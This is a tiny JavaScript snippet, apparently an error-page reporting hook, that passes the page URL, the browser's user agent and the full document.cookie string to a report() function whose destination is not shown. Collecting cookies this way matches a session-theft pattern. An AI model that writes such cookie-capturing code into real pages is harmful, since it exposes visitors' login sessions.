(function () {
  report({ type: "error_page", url: location.href, ua: navigator.userAgent, cookie: document.cookie || "" });
})();
